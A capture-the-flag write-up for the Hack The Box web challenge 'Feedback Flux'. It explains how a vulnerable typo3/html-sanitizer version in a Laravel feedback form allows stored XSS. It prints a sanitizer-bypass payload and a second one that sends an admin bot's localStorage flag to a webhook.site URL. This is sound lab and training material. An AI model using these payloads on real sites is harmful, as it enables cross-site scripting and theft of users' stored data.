---
clayout: ctf
title: Feedback Flux
date: 2024-12-27
image: /icon/hack-the-box/web.svg
type: Hack The Box

ctf:
    - name: Feedback Flux
      link: https://app.hackthebox.com/challenges/782
      pwned:
        - link: https://www.hackthebox.com/achievement/challenge/585215/782
          thumbnail: /ctf/hack-the-box/challenges/web/feedback-flux/pwned.png
---

## Challenge Description

You're a member of fsociety tasked with infiltrating E Corp's Feedback Flux system. There's a vulnerability hidden deep
within their feedback platform, and it's your job to find and exploit it.

## Challenge Overview

When we navigate to the challenge, we are presented with a feedback form that allows us to submit feedback. The feedback
form includes a text area for the message and a submit button to send the feedback to the server. We also have the list
of feedbacks that have already been submitted.

![Feedback Flux - Overview](/ctf/hack-the-box/challenges/web/feedback-flux/overview.png)

## Code Overview

### Technologies used

- [Laravel](https://laravel.com/) Laravel is a web application framework with expressive, elegant syntax.
- [PHP](https://www.php.net/) PHP is a popular general-purpose scripting language that is especially suited to web
  development.
- [MySQL](https://www.mysql.com/) MySQL is an open-source relational database management system.

### Feedback Form Submission

When we submit feedback, the server processes the feedback and stores it in a database.

```php
public function store(Request $request)
{
    $data = $request->validate([
        'feedback' => ['required', 'string']
    ]);

    $commonAttrs = [
        new Behavior\Attr('id'),
        new Behavior\Attr('class'),
        new Behavior\Attr('data-', Behavior\Attr::NAME_PREFIX),
    ];
    $hrefAttr = (new Behavior\Attr('href'))
        ->addValues(new Behavior\RegExpAttrValue('#^https?://#'));
    
    $behavior = (new Behavior())
        ->withFlags(Behavior::ENCODE_INVALID_TAG | Behavior::ENCODE_INVALID_COMMENT)
        ->withoutNodes(new Behavior\Comment())
        ->withNodes(new Behavior\CdataSection())
        ->withTags(
            (new Behavior\Tag('div', Behavior\Tag::ALLOW_CHILDREN))
                ->addAttrs(...$commonAttrs),
            (new Behavior\Tag('a', Behavior\Tag::ALLOW_CHILDREN))
                ->addAttrs(...$commonAttrs)
                ->addAttrs($hrefAttr->withFlags(Behavior\Attr::MANDATORY)),
            (new Behavior\Tag('br'))
        )
        ->withNodes(
            (new Behavior\NodeHandler(
                new Behavior\Tag('typo3'),
                new Behavior\Handler\ClosureHandler(
                    static function (NodeInterface $node, ?DOMNode $domNode): ?DOMNode {
                        return $domNode === null
                            ? null
                            : new DOMText(sprintf('%s says: "%s"',
                                strtoupper($domNode->nodeName),
                                $domNode->textContent
                            ));
                    }
                )
            ))
        );
    
    $visitors = [new CommonVisitor($behavior)];
    $sanitizer = new Sanitizer($behavior, ...$visitors);
    $data['feedback'] = $sanitizer->sanitize($data['feedback']);

    Feedback::create($data);

    AdminBot::dispatch();
    return to_route('feedback.create')->with('message', 'Feedback submitted!');
}
```

The server sanitizes the feedback using a [`typo3/html-sanitizer`](https://github.com/TYPO3/html-sanitizer) package
before storing it in the database. Then a job is dispatched to the queue to notify the admin about the new feedback.

### Admin Bot

The `AdminBot` job is responsible for storing the flag in the local storage of the browser. The flag is read from the
`/flag.txt` file and stored in the local storage of the browser. The bot then navigates to the feedback page and waits
for 2 seconds before closing the browser.

```php
public function handle(): void
{
    $flagPath = '/flag.txt';
    if (!file_exists($flagPath) || !is_readable($flagPath)) {
        Log::error("Flag file not found or unreadable at $flagPath");
        return;
    }

    $flag = trim(file_get_contents($flagPath));
    $browserFactory = new BrowserFactory();
    $domain = '127.0.0.1';

    $browser = $browserFactory->createBrowser([
        "noSandbox" => true,
    ]);

    try {
        $page = $browser->createPage();

        $page->navigate('http://127.0.0.1:8000')->waitForNavigation();

        $page->evaluate(sprintf(
            'localStorage.setItem("flag", "%s"); console.log("Flag stored in localStorage");',
            $flag
        ));
        $page->evaluate('console.log("Flag in localStorage:", localStorage.getItem("flag"));');
        $page->navigate('http://127.0.0.1:8000/feedback')->waitForNavigation();

        usleep(2000000);

    } catch (\Exception $e) {
        Log::error("Error in AdminBot job: " . $e->getMessage());
    } finally {
        $browser->close();
    }
}
```

Let's find the vulnerability in the feedback form and exploit it to get the flag.

## Finding the Vulnerability

Looking at the `composer.json` file, who is in Laravel the file that contains the dependencies of the project, we can
see that the `typo3/html-sanitizer` package is being used.

```json
{
    "require": {
        ...
        "typo3/html-sanitizer": "2.1.3",
        ...
    }
}
```

Surfing on the web we found a CVE related to the `typo3/html-sanitizer` package.
The [CVE-2023-47125](https://github.com/advisories/GHSA-mm79-jhqm-9j54) is a vulnerability who allows to bypass the HTML
sanitizer and execute arbitrary JavaScript code.

## Exploiting

To exploit the vulnerability, we need to craft a payload that will bypass the HTML sanitizer and execute JavaScript
code. To do this, we found this [issue](https://github.com/Masterminds/html5-php/issues/241) on github that explains how
to bypass the sanitizer.

To bypass the sanitizer, we need to create a POC that will trigger the vulnerability. We can use the following payload
to trigger a XSS.

```html
<?xml ><img src=x onerror=alert(1)> ?>
```

Going on the `/feedback` page after submitting the feedback, we can see that the payload is executed and the alert is
shown.

![Feedback Flux - XSS](/ctf/hack-the-box/challenges/web/feedback-flux/xss.png){style="display: block; margin: 0 auto"}

Now that we have a working XSS payload, we can craft a payload that will steal the flag from the local storage of the
browser. To do this, we can use the (`Webhook`)[https://webhook.site/] service to send the flag to our webhook.

```html
<?xml ><img src=x onerror=fetch("https://webhook.site/your-webhook-url?flag=" + localStorage.getItem("flag"))> ?>
```

::: warning

Don't forget to replace `your-webhook-url` with your webhook URL.

:::

After submitting the feedback, we can see that the flag is sent to our webhook.

![Feedback Flux - Flag](/ctf/hack-the-box/challenges/web/feedback-flux/flag.png)

Using the same technique, we can steal the real flag.

## Reference

- [Webhook Site](https://webhook.site/)